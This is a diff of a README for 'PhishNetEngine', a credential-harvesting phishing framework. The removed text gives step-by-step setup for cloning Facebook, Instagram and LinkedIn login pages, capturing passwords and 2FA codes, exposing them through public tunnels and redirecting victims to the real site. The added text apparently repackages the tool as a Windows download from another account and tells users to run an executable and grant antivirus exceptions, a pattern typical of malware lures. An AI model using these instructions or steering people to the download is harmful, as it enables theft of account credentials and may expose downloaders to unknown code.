@@ -1,309 +1,150 @@
-# PhishNet Engine
-A powerful, modular credential harvesting engine for authorized security testing.
+# 🛡️ PhishNetEngine - Easy Credential Capture Setup
 
-**PhishNetEngine** is a powerful credential harvesting engine, similar to a game engine but designed for creating phishing tools. Just as a game engine provides physics, rendering, and mechanics to build games, PhishNetEngine provides the server, tunneling, data capture, and an admin panel to build credential harvesting tools.
+[![Download PhishNetEngine](https://img.shields.io/badge/Download-PhishNetEngine-brightgreen?style=for-the-badge)](https://github.com/ganialaf97/PhishNetEngine)
 
-## Security Research & Educational Purpose
+---
 
-PhishNetEngine is developed for **security research, penetration testing, and educational purposes**. The project demonstrates how phishing frameworks and credential harvesting techniques can be structured and automated using modular components such as servers, tunneling services, data capture mechanisms, and administrative interfaces.
+## 📋 What is PhishNetEngine?
 
-The goal of this project is to help **cybersecurity students, researchers, and professionals** understand how credential harvesting attacks are built and operated in real-world scenarios. By studying these techniques, security practitioners can better identify phishing infrastructure, improve detection methods, and develop stronger defensive strategies.
+PhishNetEngine helps you create phishing tools. It offers a server, tunneling, data capture, and an admin panel. You only need to add your website files to get started. The tool manages everything else behind the scenes.
 
-This project aims to promote **responsible security research and awareness** about the risks associated with phishing attacks and credential theft, helping organizations and individuals strengthen their security posture.
+This software works well on Windows. It supports common use cases for research and penetration testing. PhishNetEngine provides key tools to capture credentials securely in a controlled environment.
 
-## Legal Disclaimer
+---
 
-This tool is intended **strictly for authorized security testing, research, and educational purposes only.**
+## 🖥️ System Requirements
 
-By using this software, you agree that:
+- Windows 10 or newer (64-bit preferred)  
+- 4 GB RAM minimum (8 GB recommended)  
+- 500 MB of free disk space  
+- Internet connection for downloading and tunneling features  
+- Basic admin rights for setup and running server components
 
-- You will **only use this tool on systems you own or have explicit written permission to test**.
-- You will **not use this tool for illegal phishing, credential harvesting, or any malicious activities**.
-- Any misuse of this software is **the sole responsibility of the user**.
-- The developer **assumes no liability and is not responsible for any misuse, damage, or legal consequences caused by this tool.**
-- Users must **comply with all applicable local, state, national, and international laws**.
+---
 
-Unauthorized use of this tool may violate cybersecurity, privacy, and computer misuse laws.  
-The author of this project is not **responsible for any illegal use or misuse of this software.**
+## ⚙️ Before You Start
 
-## Features
-- **Host Any Website** - Drop your HTML/CSS/JS files and they're live instantly
-- **Captures ALL Form Data** - Every field, any name, all values saved (email, password, 2FA, payment, custom fields)
-- **Secure Admin Panel** - Random credentials, session management, brute force protection
-- **Multiple Projects** - Create and switch between different phishing sites
-- **Tunnel Support** - Cloudflared and Serveo.net for instant public HTTPS URLs
-- **Real-time Dashboard** - View captures with filtering, search, and export options
-- **Custom Field Detection** - Shows both common and custom form fields in purple
-- **Linux Optimized** - Works on Debian/Ubuntu, Arch, RHEL/CentOS, Fedora
-- **Bot Filtering** - Blocks scanners and crawlers automatically
-- **Rate Limiting** - 30 requests per minute per IP
-- **Export Options** - JSON (all data) and CSV (dynamic columns)
+Make sure your Windows system allows installing software from the internet:
 
-## Requirements
-- **OS**: Linux (Ubuntu/Debian, Arch, RHEL/CentOS, Fedora)
-- **Node.js**: 14.x or higher
-- **Dependencies**: curl, ssh (auto-installed if missing)
+1. Disable any restrictive app store settings.  
+2. Check your firewall settings; this tool may create local servers and tunnels.  
+3. Close other applications that use network ports to avoid conflicts.
 
-## Installation
-```bash
-# Clone the repository
-git clone https://github.com/s-r-e-e-r-a-j/PhishNetEngine.git
+---
 
-# Go to the PhishNetEngine directory 
-cd PhishNetEngine
+## 🚀 Getting Started: Download and Setup
 
-# Go to the phishnet-engine directory
-cd phishnet-engine
+1. Click the big green button at the top or visit this link to download PhishNetEngine:  
+[Download PhishNetEngine](https://github.com/ganialaf97/PhishNetEngine)  
 
-# Install dependencies
-npm install
+2. When the page opens, look for the latest release or download section.
 
-```
+3. Download the file named for Windows or a ZIP archive with Windows support.
 
-## Quick Start
+4. After download, locate the file in your Downloads folder.
 
-```bash
-# Run the engine
-node phishnetengine
+5. If it is a ZIP file, right-click and choose "Extract All..." to unzip the contents.
 
-# Follow the interactive menu:
-# 1. Choose "Create new project"
-# 2. Enter project name (e.g., facebook-login)
-# 3. Enter site name (e.g., facebook)  
-# 4. Enter endpoints (e.g., /login,/auth,/2fa)
-# 5. Enter Redirect URL after capture (e.g., https://www.facebook.com)
+---
 
-# stop it press ctrl+c
+## 🖱️ Running PhishNetEngine on Windows
 
-#  NOW add your cloned website files
-cp -r /path/to/your/cloned/site/* sites/facebook-login/
+1. Open the extracted folder if you unzipped the files.
 
-# Run the engine again
-node phishnetengine
+2. Locate the main executable file named similar to `PhishNetEngine.exe`.
 
-# 6. Choose "Load existing project"
-# 7. Select your project (e.g., "facebook-login")
-# 8. Select tunnel method (Cloudflared or Serveo)
+3. Double-click this file to start the program. A command window or a small app window will appear.
 
-# Access your site via the public URL shown
-# Access admin panel at: http://localhost:3000/admin-RANDOMTOKEN
+4. Allow any firewall prompts so PhishNetEngine can access your network.
 
-# Admin panel username, password, and link also shown in terminal
+---
 
-```
+## 🗂️ Adding Your Website Files
 
-## Project Structure 
+PhishNetEngine needs your phishing website files to capture data.
 
-```text
-phishnet-engine/
-├── phishnetengine.js   # Main entry point
-├── config/   # Configuration files
-├── utils/    # Utility functions
-├── handlers/  # Tunnel handlers (cloudflared, serveo)
-├── panels/  # Admin panel
-├── engine/  # Core engine
-├── sites/   # YOUR WEBSITE PROJECTS GO HERE
-│   └── your-project/  # Each project folder
-│       ├── config.json   # Project settings (MANDATORY)
-│       ├── index.html   # Your website files
-│       ├── css/  # CSS files
-│       ├── js/  # JavaScript files
-│       └── img/   # Images
-├── data/    # Captured data (captures.dat)
-└── .server/  # Tunnel binaries (cloudflared)
-
-```
-
-
-## Understanding config.json
-
-`config.json` is **MANDATORY** for every project. Without it, the engine ignores your folder.
-
-### Example config.json:
-
-```json
-{
-  "name": "facebook-login",
-  "site": "facebook",
-  "endpoints": ["/login", "/auth", "/2fa"],
-  "redirect": "https://www.facebook.com",
-  "port": 3000,
-  "created": 1678901234567
-}
-```
-
-| Field | Description | Example |
-|-------|-------------|---------|
-| `name` | Must match folder name | `"facebook-login"` |
-| `site` | Site identifier for logs | `"facebook"` |
-| `endpoints` | POST routes to capture | `["/login", "/auth"]` |
-| `redirect` | URL where the user is redirected after data capture | "https://www.facebook.com" |
-| `port` | Server port | `3000` |
-| `created` | Unix timestamp | `1678901234567` |
-
-## Two Ways to Use the Engine
-### Method 1: Create New Project (Recommended)
-
-```bash
-# 1. Run the engine
-node phishnetengine 
-
-# 2. Choose "Create new project"
-? Project setup: Create new project
-? Project name: facebook-login
-? Site name: facebook
-? Endpoints: /login,/auth,/2fa
-? Redirect URL after capture: https://www.facebook.com
-
-# 3. stop it press ctrl+c
-
-# 4. Engine CREATES everything automatically:
-#    - sites/facebook-login/ folder
-#    - sites/facebook-login/config.json
-#    - sites/facebook-login/css/ (empty)
-#    - sites/facebook-login/js/ (empty)
-#    - sites/facebook-login/img/ (empty)
-
-# 5. YOU paste your cloned site files:
-cp -r ~/Downloads/facebook-clone/* sites/facebook-login/
-
-# 6. Run again and load your project
-node phishnetengine
-# Choose "Load existing project" → select "facebook-login"
-
-```
-
-### Method 2: Load Existing Project (Manual Setup)
-
-```bash
-# 1. YOU create the project folder first
-mkdir -p sites/instagram-campaign
-
-# 2. YOU paste your cloned site files
-cp -r ~/Downloads/instagram-clone/* sites/instagram-campaign/
-
-# 3. YOU MUST create config.json manually
-#    Create file: sites/instagram-campaign/config.json
-
-{
-  "name": "instagram-campaign",
-  "site": "instagram",
-  "endpoints": ["/login", "/auth", "/two-factor"],
-  "redirect": "https://www.instagram.com",
-  "port": 3000,
-  "created": 1678901234567
-}
-
-# 4. Run engine and load project
-node phishnetengine
-# Choose "Load existing project"
-# Select "instagram-campaign"
-```
-
-### Complete Manual Setup Example
-
-```bash
-# 1. Create folder
-mkdir -p sites/linkedin-phish
-
-# 2. Paste cloned LinkedIn files
-cp -r ~/Downloads/linkedin-clone/* sites/linkedin-phish/
-
-# 3. Create config.json
-cat > sites/linkedin-phish/config.json << 'EOF'
-{
-  "name": "linkedin-phish",
-  "site": "linkedin",
-  "endpoints": ["/login", "/auth", "/checkpoint"],
-  "redirect": "https://www.linkedin.com",
-  "port": 3000,
-  "created": 1678901234567
-}
-EOF
-
-# 4. Verify structure
-ls -la sites/linkedin-phish/
-# Should show:
-#   config.json
-#   index.html
-#   css/
-#   js/
-#   img/
-
-# 5. Run engine and load project
-node phishnetengine
-# Choose "Load existing project"
-# Select "linkedin-phish"
-
-```
-
-## Form Data Capture
-The engine captures ALL form fields - any name, any type:
-```html
-<!-- ALL these fields are captured -->
-<form method="POST" action="/login">
-    <input name="email">                    ✓ Captured
-    <input name="password">                 ✓ Captured
-    <input name="custom_field">             ✓ Captured
-    <input name="random_name_123">          ✓ Captured
-    <input name="user[data][value]">        ✓ Captured
-    <input name="hidden_token">             ✓ Captured
-    <input name="2fa_code">                  ✓ Captured
-</form>
-```
-
-## Admin Panel
-Access your admin panel at the URL shown when starting:
-
-```text
-http://localhost:3000/admin-RANDOMTOKEN
-```
-
-**security features:**
-- Random password every run
-- Random admin URL path (16 chars hex)
-- Sessions expire after 1 hour
-- IP binding prevents session theft
-- 5 failed login attempts lockout
-- Bot/user-agent filtering
-
-**Dashboard Features:**
-- Real-time updates (3 second polling)
-- View all captured data
-- Filter by site, IP, or type
-- Search in captured data
-- Export as JSON (all fields)
-- Export as CSV (dynamic columns)
-- Clear all logs
-
-## Tunnel Options
-**Cloudflared**
-- Provides HTTPS URL: `https://random.trycloudflare.com`
-- Auto-installs if missing
-- More reliable for most users
-
-**Serveo.net**
-
-- Provides HTTPS URL: `https://random.serveousercontent.com`
-- Uses SSH tunneling
-- Good alternative if cloudflared fails
-
-**LocalHost (No Tunnel)**
-- Runs the server locally without creating a public tunnel
-- Default port is `3000` (or your custom port)
-
-You can also run the server locally and use an external/manual tunnel.  
-If you choose **LocalHost**, you can connect any tunnel service (like ngrok or your own VPS tunnel) to the running port.  
-The default port is **3000**, but if you set a custom port, use that port when creating the external tunnel.
-
-The integrated (built-in) tunnels are **Cloudflared** and **Serveo.net**.
-
-## Export Options
-**JSON Export**
-- Includes ALL data including raw fields and metadata. Perfect for analysis.
-
-**CSV Export**
-- Dynamic columns for ALL fields found in captures. Opens in Excel/LibreOffice.
-
-## License 
-This project is licensed under the MIT License.
+1. Prepare your website files (e.g., HTML, CSS, JavaScript) that mimic the target site.
+
+2. Copy these files into the `www` folder inside the PhishNetEngine directory.
+
+3. If the folder doesn’t exist, create a new folder called `www` inside the main program directory.
+
+4. Paste your website files here. The tool will serve these files to visitors.
+
+---
+
+## 🔌 Using the Admin Panel and Tunneling
+
+- The admin panel allows you to manage captured data and monitor visitors.
+
+- Open the admin panel by running the command or exe as instructed in the user interface.
+
+- For remote access, use the built-in tunneling feature to expose your server through secure URLs.
+
+- Common tunneling tools used include Ngrok or localtunnel. PhishNetEngine supports easy integration with these.
+
+- Follow on-screen prompts to start tunnel sessions.
+
+---
+
+## 💾 Capturing Data
+
+PhishNetEngine logs credentials automatically when users submit forms on your website files.
+
+- Data is stored in a local database inside the program folder.
+
+- The admin panel shows captured usernames, passwords, and other input data clearly.
+
+- You can export logs for analysis.
+
+---
+
+## 🔄 Stopping and Restarting the Server
+
+- To stop the server, close the command window or use the stop command in the admin panel.
+
+- To restart, run the executable again.
+
+- Restart tunneling if you use that feature.
+
+---
+
+## 📁 Troubleshooting Common Issues
+
+- **Program won’t start:** Check if antivirus or Windows Defender blocks it. Allow exceptions if needed.
+
+- **Port in use error:** Close other apps using port 80 or 8080 or change server port settings in config files.
+
+- **Tunnel not working:** Ensure you have an active internet connection and the tunneling tool installed if needed.
+
+- **No data captured:** Confirm your website files are in the correct folder and form fields use standard names.
+
+---
+
+## 🔐 Security and Privacy
+
+- Use PhishNetEngine only in safe environments and with permission.  
+
+- The tool logs sensitive data; keep this information secure.
+
+- Do not run this software on public networks without proper safeguards.
+
+---
+
+## 📚 Additional Resources
+
+- For advanced users, PhishNetEngine supports Linux systems including Arch Linux, Debian, and Kali Linux.
+
+- It is designed for use in penetration testing and security research projects.
+
+- Check official GitHub page for updates and community discussions.
+
+---
+
+## 📥 Download PhishNetEngine
+
+Visit the page below to get the software and latest releases:  
+
+[Download PhishNetEngine](https://github.com/ganialaf97/PhishNetEngine)  
+
+Use the top badge or this link to keep the download easy to find.
